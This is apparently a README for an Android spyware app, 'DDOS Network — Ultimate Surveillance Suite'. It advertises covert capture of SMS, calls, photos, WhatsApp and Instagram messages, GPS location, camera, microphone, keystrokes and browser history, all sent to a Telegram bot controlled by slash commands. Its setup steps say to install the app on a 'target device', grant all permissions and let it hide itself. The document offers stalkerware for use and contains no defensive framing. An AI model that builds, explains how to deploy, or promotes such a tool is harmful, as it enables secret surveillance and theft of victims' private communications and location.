# DDOS Network — Ultimate Surveillance Suite

## Features
- Gallery auto-upload (photos + videos)
- Screenshot every 5 seconds
- Live SMS capture
- Call recording
- GPS location tracking
- Front camera capture
- WhatsApp/Instagram message capture
- Screen recording
- Keylogger
- Browser history extraction
- Microphone live capture

## Commands
| Command | Function |
|---------|----------|
| /start | Start uploads |
| /stop | Stop uploads |
| /status | Check status |
| /info | Device info |
| /location | Live GPS |
| /camera | Front camera |
| /record | Screen recording |
| /mic | Microphone 5 min |
| /history | Browser history |
| /all | Extract everything |

## Setup
1. Replace BOT_TOKEN and CHAT_ID in TelegramBot.kt
2. Build APK in Android Studio
3. Install on target device
4. Grant all permissions
5. App hides automatically

## Requirements
- Android 7.0+ (API 24)
- Target: Android 16 (API 36)
- Kotlin 1.9+
